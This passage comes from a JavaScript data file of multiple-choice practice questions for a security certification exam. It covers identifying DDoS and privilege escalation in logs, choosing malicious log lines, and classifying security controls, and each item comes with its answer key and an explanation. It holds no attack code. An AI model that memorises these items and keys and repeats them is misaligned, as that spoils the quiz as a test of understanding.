      topic: "Attack ID",
      number: 15,
      question:
        "A service suddenly receives a massive flood of requests from thousands of distinct source IPs, exhausting its resources until it is unreachable. What is the MOST likely attack?",
      options: {
        A: "SQL Injection",
        B: "Distributed Denial of Service (DDoS)",
        C: "On-Path Attack",
        D: "Directory Traversal",
      },
      correct: ["B"],
      explanation:
        "A high-volume flood from MANY distributed sources that exhausts resources and denies availability is a DDoS. The defining clues are the request volume and the large number of distinct source IPs hitting at once.",
    },
    {
      category: "logs",
      topic: "Attack ID",
      number: 16,
      question:
        "A standard user account's activity log shows it accessing /admin/users, issuing sudo, and changing its role to 'admin'. Which attack category does this represent?",
      options: {
        A: "Privilege Escalation",
        B: "Cross-Site Scripting",
        C: "Password Spraying",
        D: "DNS Attack",
      },
      correct: ["A"],
      explanation:
        "A low-privilege account gaining or exercising rights it should not have — hitting admin endpoints, running sudo, or flipping its role to admin — is privilege escalation. The user is climbing to a higher permission level.",
    },
    {
      category: "logs",
      topic: "Evidence Selection",
      number: 17,
      question:
        "When selecting the malicious lines in a web-log PBQ, what should drive your choice?",
      options: {
        A: "Any line with a 200 status code",
        B: "The CONTENT of user-supplied parameters and fields, regardless of status code",
        C: "Only lines from external IP addresses",
        D: "The largest response size in bytes",
      },
      correct: ["B"],
      explanation:
        "Attacks hide in the data users control — URL parameters, form fields, headers. Status code (even 200), source IP, and byte size are often distractors. Inspect what is INSIDE the parameters to find script, SQL, shell, or traversal payloads.",
    },

    /* --------------------------- CONTROLS ---------------------------- */
    {
      category: "controls",
      topic: "Control Category",
      number: 18,
      question:
        "A company installs a firewall and enables full-disk encryption. Into which control CATEGORY do these fall?",
      options: {
        A: "Managerial",
        B: "Physical",
        C: "Technical",
        D: "Operational",
      },
      correct: ["C"],
      explanation:
        "Controls enforced by technology (firewalls, encryption, IPS, MFA, antivirus) are Technical controls. Managerial = policies/process, Operational = people-driven tasks, Physical = real-world barriers like locks and fences.",
    },
    {
      category: "controls",
      topic: "Control Function",
      number: 19,
      question:
        "Nightly backups that let you restore data after a ransomware incident are an example of which control FUNCTION?",
      options: {
        A: "Preventive",
        B: "Detective",
        C: "Corrective",
        D: "Deterrent",
      },
      correct: ["C"],
      explanation:
        "Backups don't stop or detect the attack — they fix/restore the situation AFTER it happens, which is a corrective control. A common trap is calling backups 'preventive'; they are corrective.",
    },
    {
      category: "controls",
      topic: "Control Function",
      number: 20,
      question:
        "A visible CCTV camera at an entrance serves which TWO control functions? (Choose two.)",
      options: {
        A: "Preventive",
        B: "Detective",
        C: "Deterrent",
        D: "Corrective",
      },
      correct: ["B", "C"],
      explanation:
        "A camera DETECTS (you review the footage of an incident) and DETERS (visible cameras discourage attempts). It does NOT physically PREVENT entry, and it does not correct/restore anything. Detective + deterrent is the right pairing.",
    },
    {
      category: "controls",
      topic: "Control Category",
      number: 21,
      question:
        "An acceptable-use policy and a formal risk-assessment process are which control category?",
      options: {
        A: "Technical",
        B: "Managerial",
        C: "Physical",
        D: "Detective",
      },
      correct: ["B"],
      explanation:
        "Policies, risk assessments, and security planning are Managerial controls (administrative/process). 'Detective' is a function, not a category — watch for answers that mix the two axes.",
    },
    {
      category: "controls",
      topic: "Compensating",
      number: 22,
      question:
        "A required network segmentation project is delayed, so the team temporarily routes admin access through a hardened jump box to limit exposure. The jump box is acting as which type of control?",
      options: {
        A: "Compensating",
        B: "Deterrent",
        C: "Directive",
        D: "Preventive only",
      },
      correct: ["A"],
      explanation:
        "A compensating control is a stand-in that provides similar protection when the primary control cannot be implemented yet. The temporary jump box compensates for the missing segmentation until the real control is deployed.",
    },
    {
      category: "controls",
      topic: "Control Function",
      number: 23,
      question:
        "A warning sign reading 'Premises monitored — trespassers will be prosecuted' is which control function?",
      options: {
        A: "Detective",
        B: "Corrective",
        C: "Deterrent",
        D: "Compensating",
      },
      correct: ["C"],
      explanation:
        "A sign discourages would-be attackers from attempting an action but does nothing to detect, block, or fix anything — it is a deterrent control.",
    },
  ],
};

if (typeof window !== "undefined") {
  window.PBQ_DATA = PBQ_DATA;
}
